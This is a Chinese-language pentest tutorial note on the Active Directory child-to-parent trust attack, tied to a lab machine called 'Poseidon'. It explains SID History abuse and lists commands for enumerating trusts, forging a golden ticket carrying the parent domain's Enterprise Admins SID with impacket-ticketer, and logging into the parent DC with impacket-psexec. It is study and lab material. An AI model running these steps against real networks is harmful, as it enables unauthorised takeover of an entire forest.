# 💥 AD 域內跨域信任關係攻擊 (child-to-parent-trust)

本文件說明 Active Directory 森林環境中，如何利用子網域與父網域的雙向信任關係，偽造包含額外 SID 的跨域 Golden Ticket（黃金票據）來接管父網域控制器。

---

## 🔍 漏洞成因與原理

在 Active Directory 森林（Forest）中，當建立一個子網域時，系統會自動在子網域與父網域之間建立雙向的**雙向樹狀/森林信任關係 (Bi-Directional Trust)**。

根據 Kerberos 跨網域身份驗證機制，當子網域的使用者想要存取父網域的資源時，子網域的 KDC 會簽發一個轉介票據 (Referral Ticket)，父網域的 KDC 會信任並接受該票據。
然而，在早期的 AD 架構中，轉介票據的安全性高度依賴票據中的 **SID History** 屬性。如果攻擊者完全控制了子網域（獲取了子網域的 `krbtgt` 哈希值與 Domain SID），即可使用該憑證為自己偽造一個子網域的黃金票據，並在該票據的 `SID History` 中惡意加入父網域的 **企業系統管理員 (Enterprise Admins, RID 519)** 組的 SID。
當父網域控制器收到此票據時，由於沒有啟用強大的 SID 過濾器限制，它會解析並接受 `SID History` 中的 `EA` 權限，從而直接賦予該子網域用戶對整個森林（包含父網域控制器）的最高管理員權限。這類攻擊通常被稱為 **Child-to-Parent Trust 攻擊**。

---

## 🛠️ 常見利用與繞過技巧

### 1. 偵測與確認信任關係
在子網域已控制的主機上，確認子網域與父網域的信任方向為雙向（BiDirectional）：
```powershell
# 查詢信任關係
netdom query trust

# 或是使用 PowerShell 查詢 (需 BiDirectional)
get-adtrust -filter *
```

### 2. 獲取子網域與父網域的 Domain SID
必須獲取兩個網域的 SID。可透過 `nltest` 或 PowerView 進行查詢：
```powershell
# 使用 nltest 列出網域 trusts 及其 SID (最方便)
nltest /domain_trusts /v

# 使用 PowerView 查詢
Get-DomainSid -domain sub.poseidon.yzx   # 子網域 SID
Get-DomainSid -domain poseidon.yzx       # 父網域 SID
```

### 3. 偽造包含 Extra SIDs 的跨域 Golden Ticket (ticketer)
利用子網域 `krbtgt` 帳戶的 AES-256 密鑰（或 NTLM Hash）以及兩網域的 SID，使用 Impacket 的 `ticketer` 生成偽造票據，並在 `-extra-sid` 中填入父網域的 **Enterprise Admins (EA)** 帳號 SID（父網域 SID 後綴加上 `-519`）：
```bash
impacket-ticketer -aesKey <SUB_KRBTGT_AES_KEY> -domain-sid <SUB_DOMAIN_SID> -domain <SUB_DOMAIN_FQDN> -extra-sid <PARENT_DOMAIN_SID>-519 -extra-pac administrator
```
這會產出一個 `administrator.ccache` 憑證檔案。

### 4. 進行 Pass-the-Ticket 橫向移動接管父域控
在 Kali 上將產生的票據設定至環境變數中，然後利用 Kerberos 驗證（`-k -no-pass`）以及網頁/主機名稱解析登入父域控：
```bash
# 1. 將 ccache 設定至環境變數
export KRB5CCNAME=administrator.ccache

# 2. 確保 /etc/hosts 能解析父域控主機名稱 (Kerberos 要求必須使用主機名而非 IP)
echo "<PARENT_DC_IP> dc01.poseidon.yzx poseidon.yzx" >> /etc/hosts

# 3. 使用 psexec 登入父域控
impacket-psexec -k -no-pass sub.poseidon.yzx/administrator@dc01.poseidon.yzx
```

---

# 實戰關聯
*   **靶機應用實例**：
    *   [[Poseidon]]（在控制子網域控 `DC02` 並導出 `krbtgt` 的 AES Key 後，攻擊者確認了其與父網域 `poseidon.yzx` 的雙向信任關係。使用 `ticketer` 偽造了帶有父網域 EA SID (`-519`) 的跨域 Golden Ticket。最後配合 Kerberos 驗證，使用 `psexec` 登入父網域控 `DC01`，成功取得整個 Forest 的最高控制權限）。
